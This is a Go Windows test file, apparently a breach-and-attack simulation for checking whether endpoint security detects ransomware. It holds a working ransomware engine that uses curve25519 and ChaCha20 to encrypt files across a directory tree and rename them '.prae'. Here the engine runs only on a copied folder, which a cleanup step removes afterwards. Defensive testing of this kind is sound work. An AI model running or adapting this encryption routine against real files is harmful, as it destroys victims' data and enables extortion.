// + build windows

package main

import (
	"crypto/rand"
	"crypto/sha256"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"sync"

	"github.com/praetorian-inc/chariot-bas/endpoint"
	"golang.org/x/crypto/chacha20"
	"golang.org/x/crypto/curve25519"
)

var (
	mPubl = [32]byte{0x63, 0x75, 0x72, 0x76, 0x70, 0x61, 0x74, 0x74, 0x65, 0x72, 0x6E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}
	l     sync.Mutex
)

func encryptFile(wg *sync.WaitGroup, path string) {
	defer wg.Done()

	var publicKey [32]byte
	var privateKey [32]byte
	var shared [32]byte
	var flag [6]byte
	flag[0] = 0xAB
	flag[1] = 0xBC
	flag[2] = 0xCD
	flag[3] = 0xDE
	flag[4] = 0xEF
	flag[5] = 0xF0

	seed := make([]byte, 32)
	io.ReadFull(rand.Reader, seed)
	copy(privateKey[:], seed)

	curve25519.ScalarBaseMult(&publicKey, &privateKey)
	curve25519.ScalarMult(&shared, &privateKey, &mPubl)

	err := os.Rename(path, path+".prae")
	if err != nil {
		fmt.Println(err)
		return
	}

	file, err := os.OpenFile(path+".prae", os.O_RDWR, 0)
	if err != nil {
		fmt.Println(err)
		return
	}
	defer file.Close()

	fi, err := file.Stat()
	if err != nil {
		fmt.Println(err)
		return
	}

	var offset int64
	fileSize := fi.Size()

	l.Lock()
	cc20KeyHash := sha256.Sum256([]byte(shared[:]))
	hashedCC20Key := sha256.Sum256([]byte(cc20KeyHash[:]))
	l.Unlock()

	stream, err := chacha20.NewUnauthenticatedCipher(cc20KeyHash[:], hashedCC20Key[10:22])
	if err != nil {
		fmt.Println(err)
		return
	}

	if fileSize > 0x1400000 {
		chunks := fileSize / 0xA00000
		buffer := make([]byte, 0x100000)

		var i int64
		for i = 0; i < chunks; i++ {
			fmt.Printf("Processing chunk %d\\%d (%s)\n", i+1, chunks, path)
			offset = i * 0xA00000
			file.ReadAt(buffer, offset)
			stream.XORKeyStream(buffer, buffer)
			file.WriteAt(buffer, offset)
		}
	} else {
		var sizeToEncrypt int64
		if fileSize > 0x400000 {
			sizeToEncrypt = 0x400000
		} else {
			sizeToEncrypt = fileSize
		}

		buffer := make([]byte, sizeToEncrypt)
		r, _ := file.ReadAt(buffer, offset)
		if int64(r) != sizeToEncrypt {
			return
		}

		stream.XORKeyStream(buffer, buffer)
		file.WriteAt(buffer, offset)
	}

	file.WriteAt([]byte(publicKey[:]), fileSize)
	file.WriteAt([]byte(flag[:]), fileSize+32)
}

func ransomware(dir string) {
	queueMax := runtime.GOMAXPROCS(0) * 2
	queueCounter := 0
	var wg sync.WaitGroup

	err := filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		if info.IsDir() == false {
			if strings.Contains(info.Name(), ".prae") == false {
				if queueCounter >= queueMax {
					wg.Wait()
					queueCounter = 0
				}
				wg.Add(1)
				go encryptFile(&wg, path)
				queueCounter++
			}
		}
		return nil
	})
	if err != nil {
		fmt.Println(err)
	}
	wg.Wait()
}

func createFakeDirectory() string {
	dir := os.Getenv("USERPROFILE") + "\\Downloads\\praetorian_security_test"
	os.MkdirAll(dir, os.ModePerm)
	xcopy := exec.Command("xcopy", os.Getenv("USERPROFILE")+"\\Documents", dir, "/E")
	xcopy.Run()
	return dir
}

func test() {
	ransomware(createFakeDirectory())
	endpoint.Stop(endpoint.Risk.Allowed)
}

func cleanup() {
	os.RemoveAll(os.Getenv("USERPROFILE") + "\\Downloads\\praetorian_security_test")
}

func main() {
	endpoint.Start(test, cleanup)
}
